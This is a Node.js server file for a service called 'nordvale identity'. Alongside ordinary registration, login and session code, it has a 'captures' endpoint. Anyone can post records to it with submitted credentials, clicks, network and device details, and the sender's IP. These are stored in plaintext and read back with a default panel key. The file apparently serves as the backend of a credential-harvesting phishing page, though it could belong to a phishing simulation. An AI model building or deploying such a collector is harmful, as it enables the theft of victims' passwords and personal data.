'use strict';

const http = require('node:http');
const fsp = require('node:fs/promises');
const path = require('node:path');
const crypto = require('node:crypto');

const ROOT = __dirname;
const PUBLIC_DIR = path.join(ROOT, 'public');
const DATA_DIR = process.env.DATA_DIR
  ? path.resolve(process.env.DATA_DIR)
  : path.join(ROOT, 'data');

const CONFIG = {
  port: Number(process.env.PORT || 3000),
  host: process.env.HOST || '127.0.0.1',
  panelKey: process.env.PANEL_KEY || 'nordvale',
  sessionTtlMs: Number(process.env.SESSION_TTL_MS || 1000 * 60 * 60 * 12),
  maxBodyBytes: 64 * 1024,
  maxCaptures: 5000,
  registrationOpen: process.env.REGISTRATION_OPEN !== '0',
  passwordMin: 10,
  passwordMax: 320,
  scrypt: { N: 16384, r: 8, p: 1, keyLength: 64 },
  cookieName: 'nv_sid',
  rateLimit: { windowMs: 60_000, max: 30, authMax: 10 }
};

/* ------------------------------------------------------------------ store */
class JsonStore {
  #file;
  #data;
  #chain = Promise.resolve();

  constructor(file, initial) {
    this.#file = file;
    this.#data = initial;
  }

  get data() {
    return this.#data;
  }

  async init() {
    await fsp.mkdir(path.dirname(this.#file), { recursive: true });
    try {
      const raw = await fsp.readFile(this.#file, 'utf8');
      const parsed = JSON.parse(raw);
      if (parsed && typeof parsed === 'object') this.#data = parsed;
    } catch (err) {
      if (err.code !== 'ENOENT') throw err;
      await this.#persist();
    }
  }

  async #persist() {
    const tmp = `${this.#file}.${process.pid}.tmp`;
    await fsp.writeFile(tmp, JSON.stringify(this.#data, null, 2), { mode: 0o600 });
    await fsp.rename(tmp, this.#file);
  }

  // Mutations are queued so two requests can never interleave read/write.
  mutate(fn) {
    const run = this.#chain.then(async () => {
      const result = await fn(this.#data);
      await this.#persist();
      return result;
    });
    this.#chain = run.then(() => undefined, () => undefined);
    return run;
  }
}

const accounts = new JsonStore(path.join(DATA_DIR, 'accounts.json'), {
  version: 1,
  users: []
});
const captures = new JsonStore(path.join(DATA_DIR, 'captures.json'), {
  version: 1,
  records: []
});

/* ------------------------------------------------------------------- auth */
function hashPassword(password) {
  const { N, r, p, keyLength } = CONFIG.scrypt;
  const salt = crypto.randomBytes(16);
  const hash = crypto.scryptSync(password, salt, keyLength, { N, r, p, maxmem: 64 * 1024 * 1024 });
  return `scrypt$${N}$${r}$${p}$${salt.toString('base64')}$${hash.toString('base64')}`;
}

function verifyPassword(stored, password) {
  const parts = String(stored).split('$');
  if (parts.length !== 6 || parts[0] !== 'scrypt') return false;
  const [, N, r, p, saltB64, hashB64] = parts;
  const salt = Buffer.from(saltB64, 'base64');
  const expected = Buffer.from(hashB64, 'base64');
  let actual;
  try {
    actual = crypto.scryptSync(password, salt, expected.length, {
      N: Number(N), r: Number(r), p: Number(p), maxmem: 64 * 1024 * 1024
    });
  } catch {
    return false;
  }
  if (actual.length !== expected.length) return false;
  return crypto.timingSafeEqual(actual, expected);
}

const sessions = new Map(); // sid -> { userId, expiresAt }

function createSession(userId) {
  const sid = crypto.randomBytes(32).toString('base64url');
  sessions.set(sid, { userId, expiresAt: Date.now() + CONFIG.sessionTtlMs });
  return sid;
}

function resolveSession(req) {
  const sid = parseCookies(req)[CONFIG.cookieName];
  if (!sid) return null;
  const entry = sessions.get(sid);
  if (!entry) return null;
  if (entry.expiresAt <= Date.now()) {
    sessions.delete(sid);
    return null;
  }
  return { sid, ...entry };
}

function sessionCookie(sid, maxAgeSeconds) {
  const parts = [
    `${CONFIG.cookieName}=${sid}`,
    'Path=/',
    'HttpOnly',
    'SameSite=Lax',
    `Max-Age=${maxAgeSeconds}`
  ];
  if (process.env.COOKIE_SECURE === '1') parts.push('Secure');
  return parts.join('; ');
}

function parseCookies(req) {
  const out = {};
  const header = req.headers.cookie;
  if (!header) return out;
  for (const pair of header.split(';')) {
    const idx = pair.indexOf('=');
    if (idx < 0) continue;
    const key = pair.slice(0, idx).trim();
    const value = pair.slice(idx + 1).trim();
    if (key) out[key] = decodeURIComponent(value);
  }
  return out;
}

/* ------------------------------------------------------------------ utils */
class HttpError extends Error {
  constructor(status, message) {
    super(message);
    this.status = status;
  }
}

const EMAIL_RE = /^[^\s@]{1,64}@[^\s@.]+(\.[^\s@.]+)+$/;

function normalizeEmail(value) {
  return String(value || '').trim().toLowerCase();
}

function publicUser(user) {
  return {
    id: user.id,
    email: user.email,
    createdAt: user.createdAt,
    lastLoginAt: user.lastLoginAt || null
  };
}

function readJson(req) {
  return new Promise((resolve, reject) => {
    let size = 0;
    const chunks = [];
    req.on('data', (chunk) => {
      size += chunk.length;
      if (size > CONFIG.maxBodyBytes) {
        reject(new HttpError(413, 'payload too large'));
        req.destroy();
        return;
      }
      chunks.push(chunk);
    });
    req.on('end', () => {
      const raw = Buffer.concat(chunks).toString('utf8');
      if (!raw) return resolve({});
      try {
        resolve(JSON.parse(raw));
      } catch {
        reject(new HttpError(400, 'invalid json'));
      }
    });
    req.on('error', reject);
  });
}

function sendJson(res, status, payload, extraHeaders) {
  const body = Buffer.from(JSON.stringify(payload), 'utf8');
  res.writeHead(status, {
    'Content-Type': 'application/json; charset=utf-8',
    'Content-Length': body.length,
    'Cache-Control': 'no-store',
    'X-Content-Type-Options': 'nosniff',
    ...extraHeaders
  });
  res.end(body);
}

function clientIp(req) {
  const forwarded = req.headers['x-forwarded-for'];
  if (typeof forwarded === 'string' && forwarded.length) {
    return forwarded.split(',')[0].trim();
  }
  return req.socket.remoteAddress || 'unknown';
}

/* ------------------------------------------------------------ rate limits */
const buckets = new Map(); // key -> { count, resetAt }

function rateLimit(key, max, windowMs) {
  const now = Date.now();
  const entry = buckets.get(key);
  if (!entry || entry.resetAt <= now) {
    buckets.set(key, { count: 1, resetAt: now + windowMs });
    return { ok: true, remaining: max - 1 };
  }
  entry.count += 1;
  if (entry.count > max) {
    return { ok: false, retryAfterMs: entry.resetAt - now };
  }
  return { ok: true, remaining: max - entry.count };
}

setInterval(() => {
  const now = Date.now();
  for (const [key, entry] of buckets) {
    if (entry.resetAt <= now) buckets.delete(key);
  }
  for (const [sid, entry] of sessions) {
    if (entry.expiresAt <= now) sessions.delete(sid);
  }
}, 60_000).unref();

/* ----------------------------------------------------------------- routes */
async function register(req, res) {
  if (!CONFIG.registrationOpen) throw new HttpError(403, 'registration closed');

  const limit = rateLimit(`reg:${clientIp(req)}`, CONFIG.rateLimit.authMax, CONFIG.rateLimit.windowMs);
  if (!limit.ok) throw new HttpError(429, 'too many requests');

  const body = await readJson(req);
  const email = normalizeEmail(body.email);
  const password = typeof body.password === 'string' ? body.password : '';

  if (!EMAIL_RE.test(email)) throw new HttpError(400, 'invalid email');
  if (password.length < CONFIG.passwordMin) throw new HttpError(400, 'password too short');
  if (password.length > CONFIG.passwordMax) throw new HttpError(400, 'password too long');
  if (body.confirm !== undefined && body.confirm !== password) {
    throw new HttpError(400, 'passwords do not match');
  }

  const created = await accounts.mutate((data) => {
    const exists = data.users.some((u) => u.email === email);
    if (exists) return null;
    const user = {
      id: crypto.randomUUID(),
      email,
      passwordHash: hashPassword(password),
      createdAt: new Date().toISOString(),
      lastLoginAt: null,
      sourceIp: clientIp(req)
    };
    data.users.push(user);
    return user;
  });

  if (!created) throw new HttpError(409, 'email already registered');

  const sid = createSession(created.id);
  sendJson(res, 201, { user: publicUser(created) }, {
    'Set-Cookie': sessionCookie(sid, Math.floor(CONFIG.sessionTtlMs / 1000))
  });
}

async function login(req, res) {
  const limit = rateLimit(`login:${clientIp(req)}`, CONFIG.rateLimit.authMax, CONFIG.rateLimit.windowMs);
  if (!limit.ok) throw new HttpError(429, 'too many requests');

  const body = await readJson(req);
  const email = normalizeEmail(body.email);
  const password = typeof body.password === 'string' ? body.password : '';

  if (!email || !password) throw new HttpError(400, 'missing credentials');

  const found = accounts.data.users.find((u) => u.email === email);
  // Constant-ish work either way so a missing account and a wrong password cost the same.
  const ok = found ? verifyPassword(found.passwordHash, password) : verifyPassword(dummyHash(), password);
  if (!found || !ok) throw new HttpError(401, 'invalid credentials');

  await accounts.mutate(() => {
    found.lastLoginAt = new Date().toISOString();
  });

  const sid = createSession(found.id);
  sendJson(res, 200, { user: publicUser(found) }, {
    'Set-Cookie': sessionCookie(sid, Math.floor(CONFIG.sessionTtlMs / 1000))
  });
}

let cachedDummyHash = null;
function dummyHash() {
  if (!cachedDummyHash) cachedDummyHash = hashPassword(crypto.randomBytes(16).toString('hex'));
  return cachedDummyHash;
}

async function logout(req, res) {
  const session = resolveSession(req);
  if (session) sessions.delete(session.sid);
  sendJson(res, 200, { ok: true }, {
    'Set-Cookie': `${CONFIG.cookieName}=; Path=/; HttpOnly; SameSite=Lax; Max-Age=0`
  });
}

async function me(req, res) {
  const session = resolveSession(req);
  if (!session) throw new HttpError(401, 'not authenticated');
  const user = accounts.data.users.find((u) => u.id === session.userId);
  if (!user) throw new HttpError(401, 'not authenticated');
  sendJson(res, 200, { user: publicUser(user) });
}

function requirePanelKey(req, url) {
  const provided = req.headers['x-panel-key'] || url.searchParams.get('key') || '';
  const a = Buffer.from(String(provided));
  const b = Buffer.from(CONFIG.panelKey);
  if (a.length !== b.length || !crypto.timingSafeEqual(a, b)) {
    throw new HttpError(401, 'invalid panel key');
  }
}

async function listCaptures(req, res, url) {
  requirePanelKey(req, url);
  sendJson(res, 200, { records: captures.data.records });
}

async function createCapture(req, res) {
  const limit = rateLimit(`cap:${clientIp(req)}`, CONFIG.rateLimit.max, CONFIG.rateLimit.windowMs);
  if (!limit.ok) throw new HttpError(429, 'too many requests');

  const body = await readJson(req);
  const record = {
    id: crypto.randomUUID(),
    type: typeof body.type === 'string' ? body.type.slice(0, 32) : 'unknown',
    ts: typeof body.ts === 'string' ? body.ts.slice(0, 40) : new Date().toISOString(),
    sessionId: typeof body.sessionId === 'string' ? body.sessionId.slice(0, 64) : null,
    page: typeof body.page === 'string' ? body.page.slice(0, 2048) : null,
    clicked: body.clicked ?? null,
    credentials: body.credentials ?? null,
    network: body.network ?? null,
    device: body.device ?? null,
    sourceIp: clientIp(req)
  };

  await captures.mutate((data) => {
    data.records.push(record);
    if (data.records.length > CONFIG.maxCaptures) {
      data.records.splice(0, data.records.length - CONFIG.maxCaptures);
    }
  });

  sendJson(res, 201, { ok: true, id: record.id });
}

async function clearCaptures(req, res, url) {
  requirePanelKey(req, url);
  await captures.mutate((data) => {
    data.records.length = 0;
  });
  sendJson(res, 200, { ok: true });
}

/* ---------------------------------------------------------------- static */
const MIME = {
  '.html': 'text/html; charset=utf-8',
  '.css': 'text/css; charset=utf-8',
  '.js': 'text/javascript; charset=utf-8',
  '.json': 'application/json; charset=utf-8',
  '.svg': 'image/svg+xml',
  '.png': 'image/png',
  '.ico': 'image/x-icon',
  '.woff2': 'font/woff2'
};

async function serveStatic(req, res, url) {
  let rel = decodeURIComponent(url.pathname);
  if (rel === '/' || rel === '') rel = '/index.html';
  const target = path.join(PUBLIC_DIR, path.normalize(rel).replace(/^(\.\.[/\\])+/, ''));
  if (!target.startsWith(PUBLIC_DIR)) throw new HttpError(403, 'forbidden');

  let body;
  try {
    body = await fsp.readFile(target);
  } catch {
    throw new HttpError(404, 'not found');
  }

  res.writeHead(200, {
    'Content-Type': MIME[path.extname(target).toLowerCase()] || 'application/octet-stream',
    'Content-Length': body.length,
    'X-Content-Type-Options': 'nosniff',
    'Referrer-Policy': 'no-referrer',
    'Content-Security-Policy':
      "default-src 'self'; " +
      "script-src 'self'; " +
      "style-src 'self' 'unsafe-inline'; " +
      "img-src 'self' data:; " +
      "connect-src 'self' https://api.ipify.org https://ipapi.co; " +
      "base-uri 'none'; form-action 'self'; frame-ancestors 'none'"
  });
  res.end(body);
}

/* --------------------------------------------------------------- dispatch */
const ROUTES = new Map([
  ['POST /api/register', register],
  ['POST /api/login', login],
  ['POST /api/logout', logout],
  ['GET /api/me', me],
  ['GET /api/captures', listCaptures],
  ['POST /api/captures', createCapture],
  ['DELETE /api/captures', clearCaptures]
]);

const server = http.createServer(async (req, res) => {
  let url;
  try {
    url = new URL(req.url, `http://${req.headers.host || 'localhost'}`);
  } catch {
    return sendJson(res, 400, { error: 'bad request' });
  }

  const route = ROUTES.get(`${req.method} ${url.pathname}`);
  try {
    if (route) return await route(req, res, url);
    if (url.pathname.startsWith('/api/')) throw new HttpError(404, 'no such endpoint');
    if (req.method !== 'GET' && req.method !== 'HEAD') throw new HttpError(405, 'method not allowed');
    return await serveStatic(req, res, url);
  } catch (err) {
    if (err instanceof HttpError) {
      return sendJson(res, err.status, { error: err.message });
    }
    console.error('[error]', err);
    return sendJson(res, 500, { error: 'internal error' });
  }
});

server.requestTimeout = 15_000;
server.headersTimeout = 20_000;

(async () => {
  await accounts.init();
  await captures.init();
  server.listen(CONFIG.port, CONFIG.host, () => {
    console.log(`nordvale identity listening on http://${CONFIG.host}:${CONFIG.port}`);
    console.log(`accounts: ${path.join(DATA_DIR, 'accounts.json')}`);
  });
})().catch((err) => {
  console.error('startup failed:', err);
  process.exit(1);
});
